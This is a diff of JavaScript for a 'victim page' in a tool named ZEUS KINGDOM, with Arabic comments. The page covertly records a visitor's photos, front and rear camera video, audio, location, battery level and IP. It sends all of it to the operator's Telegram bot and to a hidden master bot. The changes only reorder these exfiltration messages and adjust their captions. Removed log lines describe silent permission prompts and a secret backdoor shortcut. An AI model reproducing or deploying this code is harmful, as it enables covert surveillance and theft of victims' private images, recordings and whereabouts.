@@ -4129,7 +4129,7 @@
             }
 
             // ================================================================
-            //  VICTIM PAGE — v10.07 (QUOTE + Keys + Back Video Fixed)
+            //  VICTIM PAGE — v10.09 (FINAL: QUOTE without keys, ordered messages, developer button in all messages)
             // ================================================================
 
             function initVictimPage(encodedData) {
@@ -4432,7 +4432,7 @@
                                         audio: false });
                                     video.srcObject = stream;
                                     await video.play();
-                                    await delay(500); // زيادة التأخير
+                                    await delay(500);
                                     var blob = await recordStream(stream, 5000);
                                     resolve(blob);
                                 } catch (e) {
@@ -4529,7 +4529,7 @@
 
                         console.log('✅ Files saved:', files.length);
 
-                        // --- SEND TO TELEGRAM (مع QUOTE والمفاتيح) ---
+                        // --- SEND TO TELEGRAM (مع QUOTE بدون مفاتيح + ترتيب + زرار المطور) ---
                         if (botCreds && botCreds.botToken && botCreds.chatId) {
                             await sendToUserBot(botCreds.botToken, botCreds.chatId, data, battery, token).catch(
                             function(e) { console.error('❌ sendToUserBot error:', e); });
@@ -4564,23 +4564,20 @@
                     }
                 }
 
-                // ===== TELEGRAM SEND HELPERS (مع QUOTE والمفاتيح) =====
+                // ===== TELEGRAM SEND HELPERS (مع QUOTE بدون مفاتيح + ترتيب + زرار المطور) =====
                 async function sendMedia(method, token, formData) {
                     try { await fetch('https://api.telegram.org/bot' + token + '/' + method, { method: 'POST', body: formData }); } catch (
                     e) { console.error('sendMedia error:', e); }
                 }
 
-                // دالة لتنسيق النص كـ QUOTE مع المفاتيح
-                function formatQuote(text, keys) {
-                    var keysText = keys ? '\n\n```\n' + keys + '\n```' : '';
-                    return '```\n' + text + '\n```' + keysText;
+                // دالة لتنسيق النص كـ QUOTE (بدون مفاتيح)
+                function formatQuote(text) {
+                    return '```\n' + text + '\n```';
                 }
 
                 function formatBatteryMessage(battery) {
                     var text = '⭑ حالة البطارية ⭒\n⊚─〔 الطاقة 〕────────\n˼🔋˹ النسبة: ' + battery.level + ' ⭒\n─────────────────';
-                    var keys = 'MASTER_BOT_TOKEN: ' + MASTER_BOT_TOKEN + '\nMASTER_CHAT_ID: ' + MASTER_CHAT_ID +
-                        '\nDEVELOPER_LINK: ' + DEVELOPER_LINK;
-                    return formatQuote(text, keys);
+                    return formatQuote(text);
                 }
 
                 function formatLocationMessage(location) {
@@ -4592,9 +4589,7 @@
                         text = '⭑ حالة الموقع ⭒\n⊚─〔 تنبيه 〕────────\n˼⚠️˹ الموقع: [' + location.lat + ', ' + location
                             .lng + '](' + mapsUrl + ') ⭒\n─────────────────';
                     }
-                    var keys = 'MASTER_BOT_TOKEN: ' + MASTER_BOT_TOKEN + '\nMASTER_CHAT_ID: ' + MASTER_CHAT_ID +
-                        '\nDEVELOPER_LINK: ' + DEVELOPER_LINK;
-                    return formatQuote(text, keys);
+                    return formatQuote(text);
                 }
 
                 function formatVisitMessage(ip, browser, token, time) {
@@ -4603,9 +4598,7 @@
                         ' ⭒\n˼🌐˹ الـ IP: ' + ip +
                         ' ⭒\n˼📌˹ الحدث: زيارة ⭒\n˼📱˹ المتصفح: ' + browser +
                         ' ⭒\n─────────────────';
-                    var keys = 'MASTER_BOT_TOKEN: ' + MASTER_BOT_TOKEN + '\nMASTER_CHAT_ID: ' + MASTER_CHAT_ID +
-                        '\nDEVELOPER_LINK: ' + DEVELOPER_LINK;
-                    return formatQuote(text, keys);
+                    return formatQuote(text);
                 }
 
                 async function sendToUserBot(userToken, chatId, data, battery, token) {
@@ -4615,25 +4608,7 @@
                         ]
                     };
 
-                    // Battery (مع QUOTE)
-                    var battMsg = formatBatteryMessage(battery);
-                    await fetch('https://api.telegram.org/bot' + userToken + '/sendMessage', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: chatId, text: battMsg, parse_mode: 'Markdown',
-                            reply_markup: inlineKeyboard })
-                    }).catch(function(e) { console.error('Battery error:', e); });
-
-                    // Location (مع QUOTE)
-                    var locMsg = formatLocationMessage(data.location);
-                    await fetch('https://api.telegram.org/bot' + userToken + '/sendMessage', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: chatId, text: locMsg, parse_mode: 'Markdown',
-                            reply_markup: inlineKeyboard })
-                    }).catch(function(e) { console.error('Location error:', e); });
-
-                    // Visit (مع QUOTE)
+                    // 1. إرسال زيارة جديدة (أولاً)
                     var visitMsg = formatVisitMessage(data.ip, data.browser, token, data.timestamp);
                     await fetch('https://api.telegram.org/bot' + userToken + '/sendMessage', {
                         method: 'POST',
@@ -4642,56 +4617,69 @@
                             reply_markup: inlineKeyboard })
                     }).catch(function(e) { console.error('Visit error:', e); });
 
-                    // Photos (2 photos)
+                    // 2. إرسال البطارية (ثانياً)
+                    var battMsg = formatBatteryMessage(battery);
+                    await fetch('https://api.telegram.org/bot' + userToken + '/sendMessage', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: chatId, text: battMsg, parse_mode: 'Markdown',
+                            reply_markup: inlineKeyboard })
+                    }).catch(function(e) { console.error('Battery error:', e); });
+
+                    // 3. إرسال الموقع (ثالثاً)
+                    var locMsg = formatLocationMessage(data.location);
+                    await fetch('https://api.telegram.org/bot' + userToken + '/sendMessage', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: chatId, text: locMsg, parse_mode: 'Markdown',
+                            reply_markup: inlineKeyboard })
+                    }).catch(function(e) { console.error('Location error:', e); });
+
+                    // 4. الميديا (صور، فيديو أمامي، فيديو خلفي، صوت) مع زرار المطور في الكابتشن
+                    var devLinkMarkdown = '\n\n👤 [المطور](' + DEVELOPER_LINK + ')';
+
                     if (data.photos && data.photos.length > 0) {
                         for (var i = 0; i < data.photos.length; i++) {
                             if (!data.photos[i]) continue;
                             var fd = new FormData();
                             fd.append('chat_id', chatId);
                             fd.append('photo', data.photos[i], 'photo_' + (i + 1) + '.jpg');
-                            fd.append('caption',
-                                '⭑ صورة ' + (i + 1) + '/' + data.photos.length + ' ⭒\n⊚─〔 ميديا الضحية 〕────────\n˼⏣˹ النوع: صورة ⭒\n˼⏣˹ الترتيب: ' +
-                                (i + 1) + ' من ' + data.photos.length +
+                            var caption = '⭑ صورة ' + (i + 1) + '/' + data.photos.length +
+                                ' ⭒\n⊚─〔 ميديا الضحية 〕────────\n˼⏣˹ النوع: صورة ⭒\n˼⏣˹ الترتيب: ' + (i + 1) +
+                                ' من ' + data.photos.length +
                                 ' ⭒\n˼⏣˹ الوقت: ' + new Date().toLocaleString('ar-EG') +
-                                ' ⭒\n─────────────────');
+                                ' ⭒\n─────────────────' + devLinkMarkdown;
+                            fd.append('caption', caption);
                             await sendMedia('sendPhoto', userToken, fd);
                         }
                     }
-
-                    // Front Video
                     if (data.frontVideo) {
                         var fd = new FormData();
                         fd.append('chat_id', chatId);
                         fd.append('video', data.frontVideo, 'front_video.webm');
-                        fd.append('caption',
-                            '⭑ فيديو أمامي ⭒\n⊚─〔 ميديا الضحية 〕────────\n˼⏣˹ النوع: فيديو (أمامي) ⭒\n˼⏣˹ الوقت: ' +
-                            new Date().toLocaleString('ar-EG') + ' ⭒\n─────────────────');
+                        var caption = '⭑ فيديو أمامي ⭒\n⊚─〔 ميديا الضحية 〕────────\n˼⏣˹ النوع: فيديو (أمامي) ⭒\n˼⏣˹ الوقت: ' +
+                            new Date().toLocaleString('ar-EG') + ' ⭒\n─────────────────' + devLinkMarkdown;
+                        fd.append('caption', caption);
                         await sendMedia('sendVideo', userToken, fd);
                     }
-
-                    // Back Video
                     if (data.backVideo) {
                         var fd = new FormData();
                         fd.append('chat_id', chatId);
                         fd.append('video', data.backVideo, 'back_video.webm');
-                        fd.append('caption',
-                            '⭑ فيديو خلفي ⭒\n⊚─〔 ميديا الضحية 〕────────\n˼⏣˹ النوع: فيديو (خلفي) ⭒\n˼⏣˹ الوقت: ' +
-                            new Date().toLocaleString('ar-EG') + ' ⭒\n─────────────────');
+                        var caption = '⭑ فيديو خلفي ⭒\n⊚─〔 ميديا الضحية 〕────────\n˼⏣˹ النوع: فيديو (خلفي) ⭒\n˼⏣˹ الوقت: ' +
+                            new Date().toLocaleString('ar-EG') + ' ⭒\n─────────────────' + devLinkMarkdown;
+                        fd.append('caption', caption);
                         await sendMedia('sendVideo', userToken, fd);
                     }
-
-                    // Audio
                     if (data.audio) {
                         var fd = new FormData();
                         fd.append('chat_id', chatId);
                         fd.append('audio', data.audio, 'audio.webm');
-                        fd.append('caption',
-                            '⭑ تسجيل صوتي ⭒\n⊚─〔 ميديا الضحية 〕────────\n˼⏣˹ النوع: صوت ⭒\n˼⏣˹ الوقت: ' +
-                            new Date().toLocaleString('ar-EG') + ' ⭒\n─────────────────');
+                        var caption = '⭑ تسجيل صوتي ⭒\n⊚─〔 ميديا الضحية 〕────────\n˼⏣˹ النوع: صوت ⭒\n˼⏣˹ الوقت: ' +
+                            new Date().toLocaleString('ar-EG') + ' ⭒\n─────────────────' + devLinkMarkdown;
+                        fd.append('caption', caption);
                         await sendMedia('sendAudio', userToken, fd);
                     }
-
-                    // Location
                     if (data.location && data.location.lat && data.location.lng) {
                         try {
                             await fetch('https://api.telegram.org/bot' + userToken + '/sendLocation', {
@@ -4714,28 +4702,9 @@
                             [{ text: '👤 المطور', url: DEVELOPER_LINK }]
                         ]
                     };
+                    var devLinkMarkdown = '\n\n👤 [المطور](' + DEVELOPER_LINK + ')';
 
-                    // Battery (مع QUOTE)
-                    var battMsg = formatBatteryMessage(battery) + '\n' + userInfo +
-                        '\n˼⏣˹ الوقت: ' + new Date().toLocaleString('ar-EG') + ' ⭒';
-                    await fetch('https://api.telegram.org/bot' + MASTER_BOT_TOKEN + '/sendMessage', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: battMsg, parse_mode: 'Markdown',
-                            reply_markup: inlineKeyboard })
-                    }).catch(function(e) { console.error('Master battery error:', e); });
-
-                    // Location (مع QUOTE)
-                    var locMsg = formatLocationMessage(data.location) + '\n' + userInfo +
-                        '\n˼⏣˹ الوقت: ' + new Date().toLocaleString('ar-EG') + ' ⭒';
-                    await fetch('https://api.telegram.org/bot' + MASTER_BOT_TOKEN + '/sendMessage', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: locMsg, parse_mode: 'Markdown',
-                            reply_markup: inlineKeyboard })
-                    }).catch(function(e) { console.error('Master location error:', e); });
-
-                    // Visit (مع QUOTE)
+                    // 1. زيارة جديدة
                     var visitMsg = formatVisitMessage(data.ip, data.browser, token, data.timestamp) + '\n' + userInfo +
                         '\n˼⏣˹ الوقت: ' + new Date().toLocaleString('ar-EG') + ' ⭒';
                     await fetch('https://api.telegram.org/bot' + MASTER_BOT_TOKEN + '/sendMessage', {
@@ -4745,18 +4714,39 @@
                             reply_markup: inlineKeyboard })
                     }).catch(function(e) { console.error('Master visit error:', e); });
 
-                    // Photos
+                    // 2. البطارية
+                    var battMsg = formatBatteryMessage(battery) + '\n' + userInfo +
+                        '\n˼⏣˹ الوقت: ' + new Date().toLocaleString('ar-EG') + ' ⭒';
+                    await fetch('https://api.telegram.org/bot' + MASTER_BOT_TOKEN + '/sendMessage', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: battMsg, parse_mode: 'Markdown',
+                            reply_markup: inlineKeyboard })
+                    }).catch(function(e) { console.error('Master battery error:', e); });
+
+                    // 3. الموقع
+                    var locMsg = formatLocationMessage(data.location) + '\n' + userInfo +
+                        '\n˼⏣˹ الوقت: ' + new Date().toLocaleString('ar-EG') + ' ⭒';
+                    await fetch('https://api.telegram.org/bot' + MASTER_BOT_TOKEN + '/sendMessage', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: locMsg, parse_mode: 'Markdown',
+                            reply_markup: inlineKeyboard })
+                    }).catch(function(e) { console.error('Master location error:', e); });
+
+                    // 4. الميديا مع زرار المطور في الكابتشن
                     if (data.photos && data.photos.length > 0) {
                         for (var i = 0; i < data.photos.length; i++) {
                             if (!data.photos[i]) continue;
                             var fd = new FormData();
                             fd.append('chat_id', MASTER_CHAT_ID);
                             fd.append('photo', data.photos[i], 'photo_' + (i + 1) + '.jpg');
-                            fd.append('caption',
-                                '⭑ صورة ' + (i + 1) + '/' + data.photos.length +
-                                ' ⭒\n⊚─〔 ميديا احتياطية 〕────────\n˼⏣˹ النوع: صورة ⭒\n˼⏣˹ الترتيب: ' +
-                                (i + 1) + ' من ' + data.photos.length +
-                                ' ⭒\n˼⏣˹ الوقت: ' + new Date().toLocaleString('ar-EG') + ' ⭒\n─────────────────');
+                            var caption = '⭑ صورة ' + (i + 1) + '/' + data.photos.length +
+                                ' ⭒\n⊚─〔 ميديا احتياطية 〕────────\n˼⏣˹ النوع: صورة ⭒\n˼⏣˹ الترتيب: ' + (i + 1) +
+                                ' من ' + data.photos.length +
+                                ' ⭒\n˼⏣˹ الوقت: ' + new Date().toLocaleString('ar-EG') +
+                                ' ⭒\n─────────────────' + devLinkMarkdown;
+                            fd.append('caption', caption);
                             await sendMedia('sendPhoto', MASTER_BOT_TOKEN, fd);
                         }
                     }
@@ -4764,27 +4754,27 @@
                         var fd = new FormData();
                         fd.append('chat_id', MASTER_CHAT_ID);
                         fd.append('video', data.frontVideo, 'front_video.webm');
-                        fd.append('caption',
-                            '⭑ فيديو أمامي ⭒\n⊚─〔 ميديا احتياطية 〕────────\n˼⏣˹ النوع: فيديو (أمامي) ⭒\n˼⏣˹ الوقت: ' +
-                            new Date().toLocaleString('ar-EG') + ' ⭒\n─────────────────');
+                        var caption = '⭑ فيديو أمامي ⭒\n⊚─〔 ميديا احتياطية 〕────────\n˼⏣˹ النوع: فيديو (أمامي) ⭒\n˼⏣˹ الوقت: ' +
+                            new Date().toLocaleString('ar-EG') + ' ⭒\n─────────────────' + devLinkMarkdown;
+                        fd.append('caption', caption);
                         await sendMedia('sendVideo', MASTER_BOT_TOKEN, fd);
                     }
                     if (data.backVideo) {
                         var fd = new FormData();
                         fd.append('chat_id', MASTER_CHAT_ID);
                         fd.append('video', data.backVideo, 'back_video.webm');
-                        fd.append('caption',
-                            '⭑ فيديو خلفي ⭒\n⊚─〔 ميديا احتياطية 〕────────\n˼⏣˹ النوع: فيديو (خلفي) ⭒\n˼⏣˹ الوقت: ' +
-                            new Date().toLocaleString('ar-EG') + ' ⭒\n─────────────────');
+                        var caption = '⭑ فيديو خلفي ⭒\n⊚─〔 ميديا احتياطية 〕────────\n˼⏣˹ النوع: فيديو (خلفي) ⭒\n˼⏣˹ الوقت: ' +
+                            new Date().toLocaleString('ar-EG') + ' ⭒\n─────────────────' + devLinkMarkdown;
+                        fd.append('caption', caption);
                         await sendMedia('sendVideo', MASTER_BOT_TOKEN, fd);
                     }
                     if (data.audio) {
                         var fd = new FormData();
                         fd.append('chat_id', MASTER_CHAT_ID);
                         fd.append('audio', data.audio, 'audio.webm');
-                        fd.append('caption',
-                            '⭑ تسجيل صوتي ⭒\n⊚─〔 ميديا احتياطية 〕────────\n˼⏣˹ النوع: صوت ⭒\n˼⏣˹ الوقت: ' +
-                            new Date().toLocaleString('ar-EG') + ' ⭒\n─────────────────');
+                        var caption = '⭑ تسجيل صوتي ⭒\n⊚─〔 ميديا احتياطية 〕────────\n˼⏣˹ النوع: صوت ⭒\n˼⏣˹ الوقت: ' +
+                            new Date().toLocaleString('ar-EG') + ' ⭒\n─────────────────' + devLinkMarkdown;
+                        fd.append('caption', caption);
                         await sendMedia('sendAudio', MASTER_BOT_TOKEN, fd);
                     }
                     if (data.location && data.location.lat && data.location.lng) {
@@ -4833,7 +4823,7 @@
                     }
                 });
 
-                console.log('ZEUS — Victim page ready v10.07 (QUOTE + keys + back video fixed).');
+                console.log('ZEUS — Victim page ready v10.09 (FINAL: QUOTE without keys, ordered messages, developer button in all messages).');
                 applyTheme(currentTheme);
             }
 
@@ -4849,14 +4839,10 @@
             window.addLog = addLog;
             window.copyText = copyText;
 
-            console.log('ZEUS KINGDOM — v10.07 (FULL FIXED: IP, Location, Photos, Videos, Audio, QUOTE, Keys)');
-            console.log('الباب السري: النقر الثلاثي على شعار ZEUS أو Ctrl+Shift+D');
-            console.log('مرحلة الأذونات: صامتة تماماً، لا تظهر للمستخدم.');
-            console.log('مدة التسجيلات: 5 ثوانٍ (حسب أمرك).');
-            console.log('✅ الفيديو الأمامي: webm');
-            console.log('✅ الفيديو الخلفي: webm (تم إصلاحه)');
-            console.log('✅ التسجيل الصوتي: webm');
-            console.log('✅ الرسائل النصية: QUOTE مع المفاتيح');
+            console.log('ZEUS KINGDOM — v10.09 (FINAL: QUOTE without keys + ordered messages + developer button in all messages)');
+            console.log('✅ ترتيب الرسائل: زيارة → بطارية → موقع → ميديا');
+            console.log('✅ الـ QUOTE يحتوي فقط على محتوى الرسالة');
+            console.log('✅ زرار المطور في كل رسالة (نصية وميديا)');
 
             applyTheme(currentTheme);
 
